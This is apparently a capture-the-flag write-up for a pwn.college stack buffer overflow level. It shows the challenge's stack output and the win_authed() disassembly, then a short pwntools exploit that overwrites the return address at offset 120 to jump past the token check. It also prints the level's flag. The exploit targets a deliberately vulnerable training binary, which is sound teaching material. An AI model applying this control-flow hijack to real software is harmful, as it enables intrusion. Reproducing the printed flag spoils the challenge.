# Tricky control hijack (easy)

## Flag 

`pwn.college{wsYqT6CoeYyRwOb6DCcL1Jivl9C.0VO5IDLzQjN0czW}`

## Solve

- looking at the code we can see that we need to write `0x1337` into token and also overwrite the address that the `$RIP` is pointing to the address of the win_auth() function.

- lets run the binary now :
```bash
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fffdf0c2b40 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2b48 (rsp+0x0008) | 08 3d 0c df ff 7f 00 00 | 0x00007fffdf0c3d08 |
| 0x00007fffdf0c2b50 (rsp+0x0010) | f8 3c 0c df ff 7f 00 00 | 0x00007fffdf0c3cf8 |
| 0x00007fffdf0c2b58 (rsp+0x0018) | a0 06 c2 e0 01 00 00 00 | 0x00000001e0c206a0 |
| 0x00007fffdf0c2b60 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2b68 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2b70 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2b78 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2b80 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2b88 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2b90 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2b98 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2ba0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2ba8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2bb0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2bb8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2bc0 (rsp+0x0080) | 90 11 40 00 00 00 00 00 | 0x0000000000401190 |
| 0x00007fffdf0c2bc8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffdf0c2bd0 (rsp+0x0090) | 00 3c 0c df ff 7f 00 00 | 0x00007fffdf0c3c00 |
| 0x00007fffdf0c2bd8 (rsp+0x0098) | 14 27 40 00 00 00 00 00 | 0x0000000000402714 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7fffdf0c2b40, and our base pointer points to 0x7fffdf0c2bd0.
This means that we have (decimal) 20 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 160 bytes.
The input buffer begins at 0x7fffdf0c2b60, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 94 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7fffdf0c2bd8, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (94 to fill the buffer,
26 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7fffdf0c2b60 (the start of the input buffer)
right up to (but not including) 0x7fffdf0c3b60 (which is 4002 bytes beyond the end of the buffer).
Of these, you will overwrite 3976 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Speifically, the win_authed() function looks something like:
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }

So how do you pass the check? There *is* a way, and we will cover it later,
but for now, we will simply bypass it! You can overwrite the return address
with *any* value (as long as it points to executable code), not just the start
of functions. Let's overwrite past the token check in win!

To do this, we will need to analyze the program with objdump, identify where
the check is in the win_authed() function, find the address right after the check,
and write that address over the saved return address.

Go ahead and find this address now. When you're ready, input a buffer overflow
that will overwrite the saved return address (at 0x7fffdf0c2bd8, 120 bytes into the buffer)
with the correct value.

Send your payload (up to 4096 bytes)!

``` 


- we know offset to the `$rip` is 120 bytes now lets objdump to get the win_auth address.


```
0000000000401f87 <win_authed>:
  401f87:       f3 0f 1e fa             endbr64
  401f8b:       55                      push   rbp
  401f8c:       48 89 e5                mov    rbp,rsp
  401f8f:       48 83 ec 10             sub    rsp,0x10
  401f93:       89 7d fc                mov    DWORD PTR [rbp-0x4],edi
  401f96:       81 7d fc 37 13 00 00    cmp    DWORD PTR [rbp-0x4],0x1337
  401f9d:       0f 85 fe 00 00 00       jne    4020a1 <win_authed+0x11a>
  401fa3:       48 8d 3d 46 11 00 00    lea    rdi,[rip+0x1146]        # 4030f0 <_IO_stdin_used+0xf0>
  401faa:       e8 51 f1 ff ff          call   401100 <puts@plt>
  401faf:       be 00 00 00 00          mov    esi,0x0
  401fb4:       48 8d 3d 51 11 00 00    lea    rdi,[rip+0x1151]        # 40310c <_IO_stdin_used+0x10c>
  401fbb:       b8 00 00 00 00          mov    eax,0x0
  401fc0:       e8 9b f1 ff ff          call   401160 <open@plt>
  401fc5:       89 05 75 40 00 00       mov    DWORD PTR [rip+0x4075],eax        # 406040 <flag_fd.5715>
  401fcb:       8b 05 6f 40 00 00       mov    eax,DWORD PTR [rip+0x406f]        # 406040 <flag_fd.5715>
  401fd1:       85 c0                   test   eax,eax
  401fd3:       79 4d                   jns    402022 <win_authed+0x9b>
  401fd5:       e8 16 f1 ff ff          call   4010f0 <__errno_location@plt>
  401fda:       8b 00                   mov    eax,DWORD PTR [rax]
  401fdc:       89 c7                   mov    edi,eax
  401fde:       e8 9d f1 ff ff          call   401180 <strerror@plt>
  401fe3:       48 89 c6                mov    rsi,rax
  401fe6:       48 8d 3d 2b 11 00 00    lea    rdi,[rip+0x112b]        # 403118 <_IO_stdin_used+0x118>
  401fed:       b8 00 00 00 00          mov    eax,0x0
  401ff2:       e8 29 f1 ff ff          call   401120 <printf@plt>
  401ff7:       e8 34 f1 ff ff          call   401130 <geteuid@plt>
  401ffc:       85 c0                   test   eax,eax
  401ffe:       74 18                   je     402018 <win_authed+0x91>
  402000:       48 8d 3d 41 11 00 00    lea    rdi,[rip+0x1141]        # 403148 <_IO_stdin_used+0x148>
  402007:       e8 f4 f0 ff ff          call   401100 <puts@plt>
  40200c:       48 8d 3d 5d 11 00 00    lea    rdi,[rip+0x115d]        # 403170 <_IO_stdin_used+0x170>
  402013:       e8 e8 f0 ff ff          call   401100 <puts@plt>
  402018:       bf ff ff ff ff          mov    edi,0xffffffff
  40201d:       e8 4e f1 ff ff          call   401170 <exit@plt>
  402022:       8b 05 18 40 00 00       mov    eax,DWORD PTR [rip+0x4018]        # 406040 <flag_fd.5715>
  402028:       ba 00 01 00 00          mov    edx,0x100
  40202d:       48 8d 35 2c 40 00 00    lea    rsi,[rip+0x402c]        # 406060 <flag.5714>
  402034:       89 c7                   mov    edi,eax
  402036:       e8 05 f1 ff ff          call   401140 <read@plt>
  40203b:       89 05 1f 41 00 00       mov    DWORD PTR [rip+0x411f],eax        # 406160 <flag_length.5716>
  402041:       8b 05 19 41 00 00       mov    eax,DWORD PTR [rip+0x4119]        # 406160 <flag_length.5716>
  402047:       85 c0                   test   eax,eax
  402049:       7f 2c                   jg     402077 <win_authed+0xf0>
  40204b:       e8 a0 f0 ff ff          call   4010f0 <__errno_location@plt>
  402050:       8b 00                   mov    eax,DWORD PTR [rax]
  402052:       89 c7                   mov    edi,eax
  402054:       e8 27 f1 ff ff          call   401180 <strerror@plt>
  402059:       48 89 c6                mov    rsi,rax
  40205c:       48 8d 3d 65 11 00 00    lea    rdi,[rip+0x1165]        # 4031c8 <_IO_stdin_used+0x1c8>
  402063:       b8 00 00 00 00          mov    eax,0x0
  402068:       e8 b3 f0 ff ff          call   401120 <printf@plt>
  40206d:       bf ff ff ff ff          mov    edi,0xffffffff
  402072:       e8 f9 f0 ff ff          call   401170 <exit@plt>
  402077:       8b 05 e3 40 00 00       mov    eax,DWORD PTR [rip+0x40e3]        # 406160 <flag_length.5716>
  40207d:       48 98                   cdqe
  40207f:       48 89 c2                mov    rdx,rax
  402082:       48 8d 35 d7 3f 00 00    lea    rsi,[rip+0x3fd7]        # 406060 <flag.5714>
  402089:       bf 01 00 00 00          mov    edi,0x1
  40208e:       e8 7d f0 ff ff          call   401110 <write@plt>
  402093:       48 8d 3d 58 11 00 00    lea    rdi,[rip+0x1158]        # 4031f2 <_IO_stdin_used+0x1f2>
  40209a:       e8 61 f0 ff ff          call   401100 <puts@plt>
  40209f:       eb 01                   jmp    4020a2 <win_authed+0x11b>
  4020a1:       90                      nop
  4020a2:       c9                      leave
  4020a3:       c3                      ret
```

- but jumping to win address will not work since we cant get past the token check.

- instead i tried jumping to `401fa3` and it got me the flag.

- why did i jump to this address?
- because its the call just aftert the if statement thus we hijack the control flow even if we dont know the token state.
  


```
In [3]: from pwn import *
   ...: elf = ELF('./binary-exploitation-control-hijack-2-w')
   ...: payload = b'A'*120  + p64(0x401fa3)
   ...:
   ...: p = process(elf.path)
   ...:
   ...: p.send(payload)
   ...: print(p.recvall())
```


```
[x] Starting local process '/challenge/binary-exploitation-control-hijack-2-w'
[+] Starting local process '/challenge/binary-exploitation-control-hijack-2-w': pid 179
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process '/challenge/binary-exploitation-control-hijack-2-w' stopped with exit code -7 (SIGBUS) (pid 179)
[x] Receiving all data: 4.00KB
[x] Receiving all data: 7.58KB
[+] Receiving all data: Done (7.58KB)
b'The challenge() function has just been launched!\nBefore we do anything, let\'s take a look at challenge()\'s stack frame:\n+---------------------------------+-------------------------+--------------------+\n|                  Stack location |            Data (bytes) |      Data (LE int) |\n+---------------------------------+-------------------------+--------------------+\n| 0x00007fff52de6a10 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a18 (rsp+0x0008) | d8 7b de 52 ff 7f 00 00 | 0x00007fff52de7bd8 |\n| 0x00007fff52de6a20 (rsp+0x0010) | c8 7b de 52 ff 7f 00 00 | 0x00007fff52de7bc8 |\n| 0x00007fff52de6a28 (rsp+0x0018) | a0 76 3a 5b 01 00 00 00 | 0x000000015b3a76a0 |\n| 0x00007fff52de6a30 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a38 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a40 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a48 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a50 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a58 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a60 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a68 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a70 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a78 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a80 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a88 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a90 (rsp+0x0080) | 90 11 40 00 00 00 00 00 | 0x0000000000401190 |\n| 0x00007fff52de6a98 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6aa0 (rsp+0x0090) | d0 7a de 52 ff 7f 00 00 | 0x00007fff52de7ad0 |\n| 0x00007fff52de6aa8 (rsp+0x0098) | 14 27 40 00 00 00 00 00 | 0x0000000000402714 |\n+---------------------------------+-------------------------+--------------------+\nOur stack pointer points to 0x7fff52de6a10, and our base pointer points to 0x7fff52de6aa0.\nThis means that we have (decimal) 20 8-byte words in our stack frame,\nincluding the saved base pointer and the saved return address, for a\ntotal of 160 bytes.\nThe input buffer begins at 0x7fff52de6a30, partway through the stack frame,\n("above" it in the stack are other local variables used by the function).\nYour input will be read into this buffer.\nThe buffer is 94 bytes long, but the program will let you provide an arbitrarily\nlarge input length, and thus overflow the buffer.\n\nIn this level, there is no "win" variable.\nYou will need to force the program to execute the win_authed() function\nby directly overflowing into the stored return address back to main,\nwhich is stored at 0x7fff52de6aa8, 120 bytes after the start of your input buffer.\nThat means that you will need to input at least 128 bytes (94 to fill the buffer,\n26 to fill other stuff stored between the buffer and the return address,\nand 8 that will overwrite the return address).\n\nWe have disabled the following standard memory corruption mitigations for this challenge:\n- the canary is disabled, otherwise you would corrupt it before\noverwriting the return address, and the program would abort.\n- the binary is *not* position independent. This means that it will be\nlocated at the same spot every time it is run, which means that by\nanalyzing the binary (using objdump or reading this output), you can\nknow the exact value that you need to overwrite the return address with.\n\nYou have chosen to send 4096 bytes of input!\nThis will allow you to write from 0x7fff52de6a30 (the start of the input buffer)\nright up to (but not including) 0x7fff52de7a30 (which is 4002 bytes beyond the end of the buffer).\nOf these, you will overwrite 3976 bytes into the return address.\nIf that number is greater than 8, you will overwrite the entire return address.\n\nOne caveat in this challenge is that the win_authed() function must first auth:\nit only lets you win if you provide it with the argument 0x1337.\nSpeifically, the win_authed() function looks something like:\n    void win_authed(int token)\n    {\n      if (token != 0x1337) return;\n      puts("You win! Here is your flag: ");\n      sendfile(1, open("/flag", 0), 0, 256);\n      puts("");\n    }\n\nSo how do you pass the check? There *is* a way, and we will cover it later,\nbut for now, we will simply bypass it! You can overwrite the return address\nwith *any* value (as long as it points to executable code), not just the start\nof functions. Let\'s overwrite past the token check in win!\n\nTo do this, we will need to analyze the program with objdump, identify where\nthe check is in the win_authed() function, find the address right after the check,\nand write that address over the saved return address.\n\nGo ahead and find this address now. When you\'re ready, input a buffer overflow\nthat will overwrite the saved return address (at 0x7fff52de6aa8, 120 bytes into the buffer)\nwith the correct value.\n\nSend your payload (up to 4096 bytes)!\nYou sent 128 bytes!\nLet\'s see what happened with the stack:\n\n+---------------------------------+-------------------------+--------------------+\n|                  Stack location |            Data (bytes) |      Data (LE int) |\n+---------------------------------+-------------------------+--------------------+\n| 0x00007fff52de6a10 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fff52de6a18 (rsp+0x0008) | d8 7b de 52 ff 7f 00 00 | 0x00007fff52de7bd8 |\n| 0x00007fff52de6a20 (rsp+0x0010) | c8 7b de 52 ff 7f 00 00 | 0x00007fff52de7bc8 |\n| 0x00007fff52de6a28 (rsp+0x0018) | a0 76 3a 5b 01 00 00 00 | 0x000000015b3a76a0 |\n| 0x00007fff52de6a30 (rsp+0x0020) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a38 (rsp+0x0028) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a40 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a48 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a50 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a58 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a60 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a68 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a70 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a78 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a80 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a88 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6a90 (rsp+0x0080) | 41 41 41 41 80 00 00 00 | 0x0000008041414141 |\n| 0x00007fff52de6a98 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6aa0 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fff52de6aa8 (rsp+0x0098) | a3 1f 40 00 00 00 00 00 | 0x0000000000401fa3 |\n+---------------------------------+-------------------------+--------------------+\nThe program\'s memory status:\n- the input buffer starts at 0x7fff52de6a30\n- the saved frame pointer (of main) is at 0x7fff52de6aa0\n- the saved return address (previously to main) is at 0x7fff52de6aa8\n- the saved return address is now pointing to 0x401fa3.\n- the address of win_authed() is 0x401f87.\n\nIf you have managed to overwrite the return address with the correct value,\nchallenge() will jump straight to win_authed() when it returns.\nLet\'s try it now!\n\nGoodbye!\nYou win! Here is your flag:\npwn.college{wsYqT6CoeYyRwOb6DCcL1Jivl9C.0VO5IDLzQjN0czW}\n\n\n'
```